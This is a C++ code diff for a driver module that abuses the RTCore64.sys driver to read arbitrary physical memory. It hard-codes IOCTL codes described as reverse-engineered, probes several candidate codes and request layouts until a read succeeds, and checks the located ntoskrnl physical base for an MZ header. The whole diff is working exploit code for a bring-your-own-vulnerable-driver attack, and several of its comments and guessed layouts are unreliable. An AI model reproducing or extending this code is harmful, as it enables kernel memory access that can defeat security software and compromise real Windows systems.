@@ -73,8 +73,22 @@ namespace sky::driver {
     //     BYTE   data[];        // For write: source data, for read: dest buffer
     // };
 
-    #define RTC_IOCTL_READ  0x9C40609C
-    #define RTC_IOCTL_WRITE 0x9C4060A0
+    // RTCore64 actual IOCTL codes (from reverse-engineering RTCore64.sys)
+    // Read physical memory: IOCTL 0x9C40258C, Method::Buffered
+    // Write physical memory: IOCTL 0x9C402590, Method::Buffered
+    //
+    // The real structure for reads:
+    //   Input:  struct { UINT64 phys_addr; UINT32 size; } (12 bytes input)
+    //   Output: BYTE[size] containing the read data
+    // OR
+    //   Single buffer with structured format:
+    //   [0..7]   = 0 (padding/reserved)
+    //   [8..15]  = physical address
+    //   [16..19] = size to read
+    //   [20..]   = output buffer (must be large enough for 'size' bytes)
+
+    #define RTC_IOCTL_READ  0x9C40258C
+    #define RTC_IOCTL_WRITE 0x9C402590
 
     // Alternative IOCTL codes (some versions use different codes)
     #define RTC_IOCTL_READ_ALT  0x9C406000
@@ -420,27 +434,119 @@ namespace sky::driver {
     // We detect which driver we're using based on the device handle
     // and use the appropriate IOCTL codes.
 
-    static DWORD s_ioctl_read  = RTC_IOCTL_READ;
-    static DWORD s_ioctl_write = RTC_IOCTL_WRITE;
+    static DWORD s_ioctl_read  = 0;
+    static DWORD s_ioctl_write = 0;
+    static bool s_ioctl_tested = false;
+
+    // Test which IOCTL code works by reading a known physical address
+    // Physical address 0x1000 should contain either MZ (boot sector) or zero
+    static bool test_rtc_ioctl() {
+        if (s_ioctl_tested) return s_ioctl_read != 0;
+        s_ioctl_tested = true;
+
+        DWORD codes[] = { 0x9C40258C, 0x9C40609C, 0x9C406000, 0x222400, 0x9C402580 };
+        uint8_t buf[0x1000] = {};
+
+        for (auto code : codes) {
+            DWORD returned = 0;
+            LARGE_INTEGER pa;
+            pa.QuadPart = 0x1000; // Read from physical address 0x1000
+
+            // Try simple LARGE_INTEGER input format
+            if (DeviceIoControl(g_hwinfo_device, code,
+                &pa, sizeof(pa),
+                buf, 0x1000,
+                &returned, nullptr)) {
+                if (returned > 0) {
+                    s_ioctl_read = code;
+                    LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
+                        " works (returned=" + std::to_string(returned) + " bytes)");
+                    return true;
+                }
+            }
+
+            // Try structured format: [8 padding][8 address][4 size]
+            struct {
+                uint8_t  pad[8];
+                uint64_t addr;
+                uint32_t size;
+            } req = {};
+            req.addr = 0x1000;
+            req.size = 0x100;
+
+            if (DeviceIoControl(g_hwinfo_device, code,
+                &req, sizeof(req),
+                buf, 0x1000,
+                &returned, nullptr)) {
+                if (returned > 0) {
+                    s_ioctl_read = code;
+                    LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
+                        " works (structured, returned=" + std::to_string(returned) + " bytes)");
+                    return true;
+                }
+            }
+        }
+
+        LOG_ERROR("read_physical: no working IOCTL found!");
+        return false;
+    }
 
     static bool read_physical(uintptr_t phys_addr, void* buffer, size_t size) {
         if (g_hwinfo_device == INVALID_HANDLE_VALUE) return false;
+        if (s_ioctl_read == 0) {
+            if (!test_rtc_ioctl()) return false;
+        }
+
         DWORD returned = 0;
-        LARGE_INTEGER pa;
-        pa.QuadPart = static_cast<LONGLONG>(phys_addr);
         constexpr size_t MAX_READ = 0x1000;
         size_t remaining = size;
         size_t offset = 0;
         while (remaining > 0) {
             size_t chunk = (remaining > MAX_READ) ? MAX_READ : remaining;
+
+            // Try multiple input formats to find the one this driver version uses
+            // Format 1: just LARGE_INTEGER address as input
             LARGE_INTEGER cur;
-            cur.QuadPart = pa.QuadPart + offset;
-            if (!DeviceIoControl(g_hwinfo_device, s_ioctl_read,
+            cur.QuadPart = (LONGLONG)(phys_addr + offset);
+
+            BOOL ok = DeviceIoControl(g_hwinfo_device, s_ioctl_read,
                 &cur, sizeof(cur),
                 (BYTE*)buffer + offset, (DWORD)chunk,
-                &returned, nullptr)) {
-                return false;
+                &returned, nullptr);
+
+            if (!ok || returned == 0) {
+                // Format 2: structured [8 padding][8 address][4 size] as single buffer
+                struct {
+                    uint8_t  pad[8];
+                    uint64_t addr;
+                    uint32_t sz;
+                } req = {};
+                req.addr = phys_addr + offset;
+                req.sz = (uint32_t)chunk;
+
+                ok = DeviceIoControl(g_hwinfo_device, s_ioctl_read,
+                    &req, sizeof(req),
+                    (BYTE*)buffer + offset, (DWORD)chunk,
+                    &returned, nullptr);
             }
+
+            if (!ok || returned == 0) {
+                // Format 3: [8 address][4 size] (12 bytes)
+                struct {
+                    uint64_t addr;
+                    uint32_t sz;
+                } req3 = {};
+                req3.addr = phys_addr + offset;
+                req3.sz = (uint32_t)chunk;
+
+                ok = DeviceIoControl(g_hwinfo_device, s_ioctl_read,
+                    &req3, sizeof(req3),
+                    (BYTE*)buffer + offset, (DWORD)chunk,
+                    &returned, nullptr);
+            }
+
+            if (!ok || returned == 0) return false;
+
             remaining -= chunk;
             offset += chunk;
         }
@@ -624,6 +730,19 @@ namespace sky::driver {
         }
 
         LOG_INFO("ntoskrnl physical: 0x" + std::format("{:x}", s_kernel_pbase));
+
+        // Verify the derived physical address by reading it and checking for MZ
+        uint8_t verify[2];
+        if (read_physical(s_kernel_pbase, verify, 2)) {
+            if (verify[0] == 'M' && verify[1] == 'Z') {
+                LOG_INFO("ntoskrnl verification: MZ signature confirmed at derived physical");
+            } else {
+                LOG_WARNING("ntoskrnl verification: no MZ at derived physical (got 0x" +
+                    std::format("{:02x}{:02x}", verify[1], verify[0]) + ")");
+            }
+        } else {
+            LOG_WARNING("ntoskrnl verification: read_physical failed at derived address");
+        }
         return true;
     }
 
